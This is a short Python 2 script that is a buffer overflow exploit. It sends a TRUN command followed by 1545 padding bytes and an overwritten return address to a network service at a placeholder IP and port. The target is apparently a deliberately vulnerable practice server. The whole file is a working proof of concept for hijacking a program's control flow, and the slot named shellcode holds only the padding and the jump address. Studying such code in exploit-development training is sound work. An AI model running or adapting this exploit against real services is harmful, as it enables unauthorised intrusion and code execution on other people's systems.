#!/usr/bin/python
import sys, socket

#esp return address = 0x56526683

shellcode = "A" * 1545 + "\x83\x66\x52\x56"

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('<ip>',<port>))

	s.send(('TRUN /.:/ ' + shellcode))
	s.close

except:
	print "Error connecting to server!"
	sys.exit ()
